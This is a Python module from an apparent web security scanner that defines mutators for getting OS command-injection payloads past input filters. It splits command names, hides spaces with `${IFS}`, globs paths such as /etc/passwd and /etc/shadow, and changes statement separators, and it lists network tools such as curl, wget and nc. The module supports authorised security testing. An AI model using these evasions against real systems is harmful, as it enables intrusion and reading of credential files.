"""Rewrites that keep the command meaning the same and the text different.

Every entry exists because two things read the same string by different rules,
and the rewrite lands in the gap:

    the filter reads the value as text - it matches literals, tokenises on the
    characters it knows, and expands nothing;
    the shell reads the same value as a command line - it expands variables,
    removes quotes, splits words after expanding rather than before, and globs
    paths before running anything.

A rewrite is only worth having if it changes what the filter sees while the word
the shell ends up running is unchanged. One that cannot say that is noise and is
left out rather than kept because it might help.

The families are what stop a payload becoming nonsense. Three ways to hide a
space are alternatives, not layers - writing `${IFS}$IFS$9` where one separator
was wanted is a payload no shell runs. The engine already refuses to apply two
mutators of one family on top of each other, so the grouping is load-bearing.

These are derived here rather than transcribed; the grouping and the choice of
what is worth trying were worked out for crackweb, the sibling scanner, and are
the same problem.
"""

from __future__ import annotations

import re
from typing import Callable

from ...core.mutate import Kind, Mutator

# Command names a filter is likely to be listing. Splitting one costs nothing and
# defeats a list; splitting a word that merely contains one of these as a prefix
# would produce a command that no longer runs, so the match is on word edges.
SHELL_NAMES: tuple[str, ...] = (
    "echo",
    "id",
    "whoami",
    "cat",
    "ls",
    "sh",
    "bash",
    "uname",
    "curl",
    "wget",
    "nc",
    "printf",
)

# Paths a filter may be keyed on, and a spelling the shell expands to the same
# file. The glob is resolved by the shell before the command runs.
GLOB_PATHS: tuple[tuple[str, str], ...] = (
    ("/etc/passwd", "/etc/pass?d"),
    ("/etc/shadow", "/etc/shado?"),
    ("/etc/hosts", "/etc/host?"),
    ("/bin/sh", "/bin/s?"),
    ("/bin/bash", "/bin/bas?"),
)


def _replace(old: str, new: str) -> Callable[[str], str]:
    return lambda value: value.replace(old, new)


def _split_names(value: str) -> str:
    """Break a command name with `$@`.

    Outside a function `$@` expands to nothing, so the shell reads the name it
    always did. A filter matching the name as written - which is what a list of
    names is - sees a word that is on no list. The match is on word edges so that
    splitting does not land inside something like a file name.
    """
    for name in SHELL_NAMES:
        pattern = re.compile(rf"(?<![A-Za-z0-9_]){re.escape(name)}(?![A-Za-z0-9_])")
        if pattern.search(value):
            return pattern.sub(name[0] + "$@" + name[1:], value, count=1)
    return value


def _splice_first_word(value: str) -> str:
    """`cat` written `c''at`.

    The shell removes the empty quotes while joining the word back together, so
    the word it runs is unchanged and the text a filter matches is not.
    """
    match = re.search(r"(?<![A-Za-z0-9_])([A-Za-z][A-Za-z0-9_\-]*)(?![A-Za-z0-9_])", value)
    if not match:
        return value
    word = match.group(1)
    if len(word) < 2:
        return value
    spliced = word[0] + "''" + word[1:]
    return value[: match.start()] + spliced + value[match.end() :]


def _brace_expand_last(value: str) -> str:
    """The last command written `{echo,IKCLOSE}`.

    Brace expansion turns the comma-separated list into separate words, so the
    command runs with an argument and the payload contains no space at all. Only
    the last statement is rewritten: it is the one whose output the caller reads,
    and rewriting the earlier ones would change what is printed where.

    Bash expands this; dash does not, and on Debian `/bin/sh` is dash - so a
    payload using it fails outright there. That is why it has a family of its own
    rather than sitting with the other ways of hiding a space: the family is what
    lets the caller allow it for a bash target and hold it back for a dash one,
    instead of choosing between missing the bypass and burning requests on it.
    """
    index = max(value.rfind(";"), value.rfind("\n"))
    if index < 0:
        return value
    fields = value[index + 1 :].split()
    if len(fields) < 2:
        return value
    return value[: index + 1] + "{" + ",".join(fields) + "}"


def _glob_a_path(value: str) -> str:
    """A path written with a `?` for one character.

    The shell resolves the glob before running anything, so the file is the same
    file and the literal path a filter is keyed on never appears.
    """
    for literal, globbed in GLOB_PATHS:
        if literal in value:
            return value.replace(literal, globbed, 1)
    return value


def _arithmetic_alternative(value: str) -> str:
    """`$((a+b))` written as `$(expr a + b)`.

    Two spellings of "compute this". A filter blocking the first is matching a
    syntax rather than a capability, and the second computes the same number.

    `expr` is not a shell builtin taking an expression the way `$(( ))` does: it
    takes operands as separate arguments, and `expr 2+3` prints `2+3` rather than
    `5`. The spaces are the whole difference between a working payload and one
    that echoes itself, which is exactly the failure this tool exists to avoid.
    """
    return re.sub(r"\$\(\((\d+)\+(\d+)\)\)", r"$(expr \1 + \2)", value)


def _statements(old: str, new: str) -> Callable[[str], str]:
    """Rewrite the separators *between* the payload's commands, not the leading one.

    The one at the front is the delivery - it ends the command the application
    chose - and rewriting it changes where the payload starts rather than how its
    own parts are joined.

    This exists because the proof is three statements, so its own joiners are
    characters a filter can key on: a rule blocking `;` blocks every seed the
    module builds, delivery prefix or not, until the joiners change too. A
    newline and `&&` both join them without changing what runs - `echo` succeeds,
    so `&&` chains, and the two prints and the computation all reach the output.

    `|` is not offered, and that is measured rather than assumed: in a pipeline
    every command still runs, but only the last one's output is connected to the
    response - `; echo A| echo B| echo C` answers with one marker instead of
    three. The payload works and the proof does not come back, which reads as a
    miss on a target where the injection was fine.
    """

    def apply(value: str) -> str:
        for mark in ("; ", ";", "&& ", "|| ", "| ", "\n"):
            if value.startswith(mark):
                return mark + value[len(mark) :].replace(old, new)
        return value.replace(old, new)

    return apply


COMMAND_MUTATORS: tuple[Mutator, ...] = (
    # -- the command name, made something a list does not contain.
    Mutator("cmd-name-split", _split_names, (Kind.COMMAND,), family="cmd-name", weight=70),
    Mutator("cmd-name-splice", _splice_first_word, (Kind.COMMAND,), family="cmd-name", weight=71),
    # -- where the filter stops looking for a separator.
    #
    # `$IFS` bare is not here. Followed by a letter it is read as part of the
    # variable name - `echo$IFSA` is the variable `IFSA`, which is empty, so the
    # command prints nothing. Measured, not assumed. `${IFS}` and `$IFS$9` both
    # end the name explicitly and both work.
    Mutator(
        "cmd-space-ifs-brace",
        _replace(" ", "${IFS}"),
        (Kind.COMMAND,),
        family="cmd-space",
        weight=72,
    ),
    Mutator(
        "cmd-space-ifs-positional",
        _replace(" ", "$IFS$9"),
        (Kind.COMMAND,),
        family="cmd-space",
        weight=73,
    ),
    Mutator("cmd-space-tab", _replace(" ", "\t"), (Kind.COMMAND,), family="cmd-space", weight=74),
    # -- bash only, and gated on that rather than dropped.
    Mutator(
        "cmd-space-brace", _brace_expand_last, (Kind.COMMAND,), family="cmd-brace", weight=75
    ),
    # -- a path the filter is keyed on, spelled so the shell finds it anyway.
    Mutator("cmd-path-glob", _glob_a_path, (Kind.COMMAND,), family="cmd-path", weight=76),
    # -- how the proof's own statements are joined.
    #
    # Its joiners are characters a filter can key on, so a rule blocking `;`
    # blocks every seed until these change too. The pipe form is deliberately
    # absent - see `_statements` for what was measured.
    Mutator(
        "cmd-sep-newline", _statements("; ", "\n"), (Kind.COMMAND,), family="cmd-sep", weight=77
    ),
    Mutator("cmd-sep-amp", _statements("; ", "&& "), (Kind.COMMAND,), family="cmd-sep", weight=78),
    # -- the same capability, spelled another way.
    Mutator("cmd-expr", _arithmetic_alternative, (Kind.COMMAND,), family="cmd-compute", weight=82),
)


def register() -> None:
    """Contribute these to the shared set, once."""
    from ...core.mutate import register as _register

    _register(*COMMAND_MUTATORS)
